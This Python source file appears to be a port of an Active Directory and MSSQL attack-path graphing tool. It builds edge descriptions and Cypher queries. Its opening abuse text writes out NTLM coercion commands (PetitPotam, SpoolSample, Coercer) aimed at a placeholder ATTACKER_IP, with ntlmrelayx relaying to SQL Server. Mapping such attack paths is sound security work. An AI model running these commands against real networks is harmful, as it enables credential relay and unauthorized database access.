        "# 2. Trigger authentication from target computer using: \n"
        "# - PrinterBug/SpoolSample \n"
        "SpoolSample.exe TARGET_COMPUTER ATTACKER_IP \n"
        "# - PetitPotam \n"
        "PetitPotam.py -u '' -p '' ATTACKER_IP TARGET_COMPUTER \n"
        "# - Coercer with various methods \n"
        "coercer.py coerce -u '' -p '' -t TARGET_COMPUTER -l ATTACKER_IP \n"
        "# 3. Relay executes SQL commands as DOMAIN\\COMPUTER$ "
    )
    lin = (
        "Coerce and relay authentication to SQL Server:\n"
        "# 1. Set up NTLM relay targeting SQL Server \n"
        f"ntlmrelayx.py -t mssql://{ctx.sql_server_name} -smb2support \n"
        "# 2. Trigger authentication using various methods: \n"
        "# - PetitPotam (unauthenticated) \n"
        "python3 PetitPotam.py ATTACKER_IP TARGET_COMPUTER \n"
        "# - Coercer with multiple protocols \n"
        "coercer.py coerce -u '' -p '' -t TARGET_COMPUTER -l ATTACKER_IP --filter-protocol-name \n"
        "# - PrinterBug via Wine \n"
        "wine SpoolSample.exe TARGET_COMPUTER ATTACKER_IP \n"
        "# 3. ntlmrelayx will authenticate to SQL and execute commands "
    )
    return (
        "The computer account has a SQL Server login and the SQL Server has Extended "
        "Protection disabled. This allows coercing the computer account "
        "authentication and relaying it to SQL Server to gain access.",
        win,
        lin,
        "Coercion methods may generate logs on the target system (Event ID "
        "4624/4625). SQL Server logs will show authentication from the computer "
        "account. NTLM authentication to SQL Server is normal behavior. Extended "
        "Protection prevents this attack when enabled.",
        "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection?view=sql-server-ver17 \n"
        "- https://github.com/topotam/PetitPotam \n"
        "- https://github.com/p0dalirius/Coercer \n"
        "- https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py",
    )


# ---------------------------------------------------------------------------
# Composition Cypher generators (Go edgeCompositionGenerators), Stage-6 subset.
# ---------------------------------------------------------------------------
def _comp_add_member(ctx: EdgeCtx) -> str:
    if ctx.target_type_description == "SERVER_ROLE":
        return (
            "MATCH (source {objectid: '" + _esc(ctx.source_id) + "'}), (server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), (role:MSSQL_ServerRole {objectid: '" + _esc(ctx.target_id) + "'})\n"
            "OPTIONAL MATCH p1 = (source)-[:MSSQL_AlterAnyServerRole]->(server)\n"
            "OPTIONAL MATCH p2 = (server)-[:MSSQL_Contains]->(role)\n"
            "OPTIONAL MATCH p3 = (source)-[:MSSQL_Alter|MSSQL_Control]->(role)\n"
            "MATCH p4 = (source)-[:MSSQL_AddMember]->(role)\n"
            "WHERE (p1 IS NOT NULL AND p2 IS NOT NULL) OR p3 IS NOT NULL\n"
            "RETURN p1, p2, p3, p4"
        )
    return (
        "MATCH (source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
        "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
        "(database:MSSQL_Database {objectid: '" + _esc(_extract_db_id(ctx.target_id)) + "'}),\n"
        "(role:MSSQL_DatabaseRole {objectid: '" + _esc(ctx.target_id) + "'})\n"
        "MATCH p0 = (source)-[:MSSQL_AddMember]->(role)\n"
        "MATCH p1 = (server)-[:MSSQL_Contains]->(database)\n"
        "MATCH p2 = (database)-[:MSSQL_Contains]->(source)\n"
        "MATCH p3 = (database)-[:MSSQL_Contains]->(role)\n"
        "OPTIONAL MATCH p4 = (source)-[:MSSQL_AlterAnyDBRole]->(database)\n"
        "OPTIONAL MATCH p5 = (source)-[:MSSQL_Alter|MSSQL_Control]->(role)\n"
        "RETURN p0, p1, p2, p3, p4, p5"
    )


def _comp_take_ownership(ctx: EdgeCtx) -> str:
    if ctx.target_type_description == "SERVER_ROLE":
        return (
            "MATCH \n(source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
            "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
            "(role:MSSQL_ServerRole {objectid: '" + _esc(ctx.target_id) + "'})\n"
            "MATCH p0 = (source)-[:MSSQL_TakeOwnership]->(role)\n"
            "MATCH p1 = (server)-[:MSSQL_Contains]->(source)\n"
            "MATCH p2 = (server)-[:MSSQL_Contains]->(role)\n"
            "RETURN p0, p1, p2"
        )
    if ctx.target_type_description == "DATABASE_ROLE":
        return (
            "MATCH \n(source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
            "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
            "(database:MSSQL_Database {objectid: '" + _esc(_extract_db_id(ctx.target_id)) + "'}),\n"
            "(role:MSSQL_DatabaseRole {objectid: '" + _esc(ctx.target_id) + "'})\n"
            "MATCH p0 = (source)-[:MSSQL_TakeOwnership]->(role)\n"
            "MATCH p1 = (server)-[:MSSQL_Contains]->(database)\n"
            "MATCH p2 = (database)-[:MSSQL_Contains]->(source)\n"
            "MATCH p3 = (database)-[:MSSQL_Contains]->(role)\n"
            "RETURN p0, p1, p2, p3"
        )
    return ""


def _comp_change_owner(ctx: EdgeCtx) -> str:
    if ctx.target_type_description == "SERVER_ROLE":
        return (
            "MATCH \n(source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
            "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
            "(role:MSSQL_ServerRole {objectid: '" + _esc(ctx.target_id) + "'})\n"
            "MATCH p0 = (source)-[:MSSQL_ChangeOwner]->(role) \n"
            "MATCH p1 = (server)-[:MSSQL_Contains]->(source)\n"
            "MATCH p2 = (server)-[:MSSQL_Contains]->(role)\n"
            "MATCH p3 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(role) \n"
            "RETURN p0, p1, p2, p3"
        )
    if ctx.target_type_description == "DATABASE_ROLE":
        return (
            "MATCH \n(source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
            "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
            "(database:MSSQL_Database {objectid: '" + _esc(_extract_db_id(ctx.target_id)) + "'}),\n"
            "(role:MSSQL_DatabaseRole {objectid: '" + _esc(ctx.target_id) + "'})\n"
            "MATCH p0 = (source)-[:MSSQL_ChangeOwner]->(role)\n"
            "MATCH p1 = (server)-[:MSSQL_Contains]->(database)\n"
            "MATCH p2 = (database)-[:MSSQL_Contains]->(source) \n"
            "MATCH p3 = (database)-[:MSSQL_Contains]->(role) \n"
            "OPTIONAL MATCH p4 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(database) \n"
            "OPTIONAL MATCH p5 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(role) \n"
            "RETURN p0, p1, p2, p3, p4, p5"
        )
    return ""


def _comp_change_password(ctx: EdgeCtx) -> str:
    if ctx.target_type_description == "APPLICATION_ROLE":
        return (
            "MATCH \n(source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
            "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
            "(database:MSSQL_Database {objectid: '" + _esc(_extract_db_id(ctx.target_id)) + "'}),\n"
            "(role:MSSQL_ApplicationRole {objectid: '" + _esc(ctx.target_id) + "'})\n"
            "MATCH p0 = (source)-[:MSSQL_ChangePassword]->(role)\n"
            "MATCH p1 = (server)-[:MSSQL_Contains]->(database)\n"
            "MATCH p2 = (database)-[:MSSQL_Contains]->(source) \n"
            "MATCH p3 = (database)-[:MSSQL_Contains]->(role) \n"
            "MATCH p4 = (source)-[:MSSQL_AlterAnyAppRole]->(database) \n"
            "RETURN p0, p1, p2, p3, p4"
        )
    return (
        "MATCH \n(source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
        "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
        "(login:MSSQL_Login {objectid: '" + _esc(ctx.target_id) + "'})\n"
        "MATCH p0 = (source)-[:MSSQL_ChangePassword]->(login)\n"
        "MATCH p1 = (server)-[:MSSQL_Contains]->(source) \n"
        "MATCH p2 = (server)-[:MSSQL_Contains]->(login) \n"
        "MATCH p3 = (source)-[:MSSQL_AlterAnyLogin]->(server) \n"
        "RETURN p0, p1, p2, p3"
    )


def _comp_execute_as(ctx: EdgeCtx) -> str:
    if ctx.database_name != "":
        return (
            "MATCH \n(source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
            "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
            "(database:MSSQL_Database {objectid: '" + _esc(_extract_db_id(ctx.target_id)) + "'}),\n"
            "(target:MSSQL_DatabaseUser {objectid: '" + _esc(ctx.target_id) + "'})\n"
            "MATCH p0 = (source)-[:MSSQL_ExecuteAs]->(target)\n"
            "MATCH p1 = (server)-[:MSSQL_Contains]->(database)\n"
            "MATCH p2 = (database)-[:MSSQL_Contains]->(source) \n"
            "MATCH p3 = (database)-[:MSSQL_Contains]->(target) \n"
            "MATCH p4 = (source)-[:MSSQL_Impersonate|MSSQL_Control]->(target) \n"
            "RETURN p0, p1, p2, p3, p4"
        )
    return (
        "MATCH \n(source {objectid: '" + _esc(ctx.source_id) + "'}), \n"
        "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
        "(target:MSSQL_Login {objectid: '" + _esc(ctx.target_id) + "'})\n"
        "MATCH p0 = (source)-[:MSSQL_ExecuteAs]->(target)\n"
        "MATCH p1 = (server)-[:MSSQL_Contains]->(source) \n"
        "MATCH p2 = (server)-[:MSSQL_Contains]->(target) \n"
        "MATCH p3 = (source)-[:MSSQL_Impersonate|MSSQL_Control]->(target) \n"
        "RETURN p0, p1, p2, p3"
    )


def _comp_execute_as_owner(ctx: EdgeCtx) -> str:
    return (
        "MATCH \n(database:MSSQL_Database {objectid: '" + _esc(ctx.source_id) + "'}), \n"
        "(server:MSSQL_Server {objectid: database.SQLServerID}), \n"
        "(owner:MSSQL_Login {objectid: toUpper(database.OwnerObjectIdentifier)})\n"
        "MATCH p0 = (database)-[:MSSQL_ExecuteAsOwner]->(server)\n"
        "MATCH p1 = (owner)-[:MSSQL_Owns]->(database)\n"
        "OPTIONAL MATCH p2 = (owner)-[:MSSQL_ControlServer|:MSSQL_ImpersonateAnyLogin]->(server)\n"
        "OPTIONAL MATCH p3 = (owner)-[:MSSQL_MemberOf*]->(:MSSQL_ServerRole)-[:MSSQL_ControlServer|:MSSQL_ImpersonateAnyLogin|:MSSQL_GrantAnyPermission]->(server)\n"
        "RETURN p0, p1, p2, p3"
    )


# ---------------------------------------------------------------------------
# Stage-7b composition generators (Go edgeCompositionGenerators): only
# ExecuteOnHost, GetAdminTGS, GetTGS, CoerceAndRelayTo have composition Cypher
# among the new kinds. (LinkedTo/LinkedAsAdmin/HostFor/ServiceAccountFor/HasLogin/
# HasSession/Has*Cred have none.) Ported verbatim from edges.go:1371-1390.
# ---------------------------------------------------------------------------
def _comp_execute_on_host(ctx: EdgeCtx) -> str:
    # edges.go:1371-1378. Computer SID = the server OID before the first ':'.
    server_id = ctx.source_id.upper()
    computer_id = server_id.split(":", 1)[0] if ":" in server_id else server_id
    return (
        "MATCH \n(server:MSSQL_Server {objectid: '" + server_id + "'}), \n"
        "(computer:Computer {objectid: '" + computer_id + "'})\n"
        "MATCH p0 = (server)-[:MSSQL_ExecuteOnHost]->(computer)\n"
        "OPTIONAL MATCH p1 = (serviceAccount)-[:MSSQL_ServiceAccountFor]->(server)\n"
        "RETURN p0, p1"
    )


def _comp_get_admin_tgs(ctx: EdgeCtx) -> str:
    # edges.go:1381-1382. Plain ToUpper on both ids (not escapeAndUpper).
    return (
        "MATCH \n(serviceAccount {objectid: '" + ctx.source_id.upper() + "'})\n"
        "MATCH p0 = (serviceAccount)-[:MSSQL_GetAdminTGS]->(server:MSSQL_Server {objectid: '" + ctx.target_id.upper() + "'})\n"
        "MATCH p1 = (server)-[:MSSQL_Contains]->(login:MSSQL_Login {isActiveDirectoryPrincipal: true})\n"
        "OPTIONAL MATCH p2 = (login)-[:MSSQL_ControlServer|:MSSQL_GrantAnyPermission|:MSSQL_ImpersonateAnyLogin]->(server)\n"
        "OPTIONAL MATCH p3 = (login)-[:MSSQL_MemberOf*]->(:MSSQL_ServerRole)-[:MSSQL_ControlServer|:MSSQL_GrantAnyPermission|:MSSQL_ImpersonateAnyLogin]->(server)\n"
        "WITH serviceAccount, server, login, p0, p2, p3\n"
        "WHERE p2 IS NOT NULL OR p3 IS NOT NULL\n"
        "OPTIONAL MATCH p4 = ()-[:MSSQL_HasLogin]->(login)\n"
        "RETURN p0, p2, p3, p4"
    )


def _comp_get_tgs(ctx: EdgeCtx) -> str:
    # edges.go:1385-1386. ToUpper(SourceID), escapeAndUpper(TargetID).
    return (
        "MATCH (serviceAccount {objectid: '" + ctx.source_id.upper() + "'}) \n"
        "MATCH p0 = (serviceAccount)-[:MSSQL_GetTGS]->(login:MSSQL_Login {objectid: '" + _esc(ctx.target_id) + "'})\n"
        "MATCH p1 = (server:MSSQL_Server)-[:MSSQL_Contains]->(login) \n"
        "MATCH p2 = ()-[:MSSQL_HasLogin]->(login) \n"
        "RETURN p0, p1, p2"
    )


def _comp_coerce_and_relay(ctx: EdgeCtx) -> str:
    # edges.go:1389-1390. coercionvictim Computer = ToUpper(SecurityIdentifier).
    return (
        "MATCH \n(source {objectid: '" + ctx.source_id.upper() + "'}), \n"
        "(server:MSSQL_Server {objectid: '" + _esc(ctx.sql_server_id) + "'}), \n"
        "(target:MSSQL_Login {objectid: '" + _esc(ctx.target_id) + "'}),\n"
        "(coercionvictim:Computer {objectid: '" + ctx.security_identifier.upper() + "'})\n"
        "MATCH p0 = (source)-[:MSSQL_CoerceAndRelayToMSSQL]->(target)\n"
        "MATCH p1 = (server)-[:MSSQL_Contains]->(target)\n"
        "MATCH p2 = (coercionvictim)-[:MSSQL_HasLogin]->(target)\n"
        "MATCH p3 = (target)-[:MSSQL_Connect]->(server)\n"
        "RETURN p0, p1, p2, p3"
    )


# Generator dispatch tables (kind -> function).
_PROPERTY_GENERATORS = {
    ek.MEMBER_OF: _gen_member_of,
    ek.IS_MAPPED_TO: _gen_is_mapped_to,
    ek.CONTAINS: _gen_contains,
    ek.OWNS: _gen_owns,
    ek.CONTROL_SERVER: _gen_control_server,
    ek.CONTROL_DB: _gen_control_db,
    ek.IMPERSONATE: _gen_impersonate,
    ek.IMPERSONATE_ANY_LOGIN: _gen_impersonate_any_login,
    ek.CHANGE_PASSWORD: _gen_change_password,
    ek.ADD_MEMBER: _gen_add_member,
    ek.ALTER: _gen_alter,
    ek.CONTROL: _gen_control,
    ek.CHANGE_OWNER: _gen_change_owner,
    ek.ALTER_ANY_LOGIN: _gen_alter_any_login,
    ek.ALTER_ANY_SERVER_ROLE: _gen_alter_any_server_role,
    ek.GRANT_ANY_PERMISSION: _gen_grant_any_permission,
    ek.GRANT_ANY_DB_PERMISSION: _gen_grant_any_db_permission,
    ek.CONNECT: _gen_connect,
    ek.CONNECT_ANY_DATABASE: _gen_connect_any_database,
    ek.ALTER_ANY_APP_ROLE: _gen_alter_any_app_role,
    ek.ALTER_ANY_DB_ROLE: _gen_alter_any_db_role,
    ek.TAKE_OWNERSHIP: _gen_take_ownership,
    ek.EXECUTE_AS: _gen_execute_as,
    ek.EXECUTE_AS_OWNER: _gen_execute_as_owner,
    ek.IS_TRUSTED_BY: _gen_is_trusted_by,
    # Stage-7b kinds.
    ek.LINKED_TO: _gen_linked_to,
    ek.LINKED_AS_ADMIN: _gen_linked_as_admin,
    ek.HAS_LOGIN: _gen_has_login,
    ek.HOST_FOR: _gen_host_for,
    ek.EXECUTE_ON_HOST: _gen_execute_on_host,
    ek.SERVICE_ACCOUNT_FOR: _gen_service_account_for,
    ek.GET_TGS: _gen_get_tgs,
    ek.GET_ADMIN_TGS: _gen_get_admin_tgs,
    ek.HAS_DB_SCOPED_CRED: _gen_has_db_scoped_cred,
    ek.HAS_MAPPED_CRED: _gen_has_mapped_cred,
    ek.HAS_PROXY_CRED: _gen_has_proxy_cred,
    ek.COERCE_AND_RELAY_TO_MSSQL: _gen_coerce_and_relay,
    # HAS_SESSION has no generator in Go -> falls back to the default general text.
}

_COMPOSITION_GENERATORS = {
    ek.ADD_MEMBER: _comp_add_member,
    ek.TAKE_OWNERSHIP: _comp_take_ownership,
    ek.CHANGE_OWNER: _comp_change_owner,
    ek.CHANGE_PASSWORD: _comp_change_password,
    ek.EXECUTE_AS: _comp_execute_as,
    ek.EXECUTE_AS_OWNER: _comp_execute_as_owner,
    # Stage-7b composition kinds (only these four among the new kinds).
    ek.EXECUTE_ON_HOST: _comp_execute_on_host,
    ek.GET_ADMIN_TGS: _comp_get_admin_tgs,
    ek.GET_TGS: _comp_get_tgs,
    ek.COERCE_AND_RELAY_TO_MSSQL: _comp_coerce_and_relay,
}

# Default text for an unknown edge kind (Go GetEdgeProperties fallback).
_DEFAULT_GENERAL = "Relationship exists between source and target."


def build_edge_properties(
    kind: str,
    ctx: EdgeCtx,
    *,
    traversable: bool,
    with_grant: bool = False,
) -> MSSQLEdgeProperties:
    """Build the :class:`MSSQLEdgeProperties` bag for *kind* (port of GetEdgeProperties).

    Mirrors Go ``GetEdgeProperties``: run the kind's generator, set only non-empty
    strings (``general`` / ``windowsAbuse`` / ``linuxAbuse`` / ``opsec`` /
    ``references``), then add ``composition`` when the kind has a composition
    generator that produces a non-empty query. ``withGrant`` is injected here when
    the source permission was ``GRANT_WITH_GRANT_OPTION`` (caller passes the flag).
    ``traversable`` comes from :func:`is_traversable_edge` (with the
    ``--disable-possible-edges`` adjustment applied by the caller).

    Returns an :class:`MSSQLEdgeProperties` with empty fields left as ``None`` so
    convert's ``asdict`` + emit filters them, matching the Go map that only carries
    present keys.
    """
    props = MSSQLEdgeProperties(traversable=traversable)

    generator = _PROPERTY_GENERATORS.get(kind)
    if generator is None:
        # Unknown kind: Go sets only a generic general string.
        logger.debug("build_edge_properties: no generator for kind %r; using default", kind)
        props.general = _DEFAULT_GENERAL
    else:
        general, windows_abuse, linux_abuse, opsec, references = generator(ctx)
        # Only non-empty strings are carried (Go Add-Edge filtering).
        if general:
            props.general = general
        if windows_abuse:
            props.windowsAbuse = windows_abuse
        if linux_abuse:
            props.linuxAbuse = linux_abuse
        if opsec:
            props.opsec = opsec
        if references:
            props.references = references

        comp_gen = _COMPOSITION_GENERATORS.get(kind)
        if comp_gen is not None:
            composition = comp_gen(ctx)
            if composition:
                props.composition = composition

    # withGrant is a typed boolean injected for GRANT_WITH_GRANT_OPTION permissions.
    if with_grant:
        props.withGrant = True

    return props


__all__ = ["EdgeCtx", "build_edge_properties"]
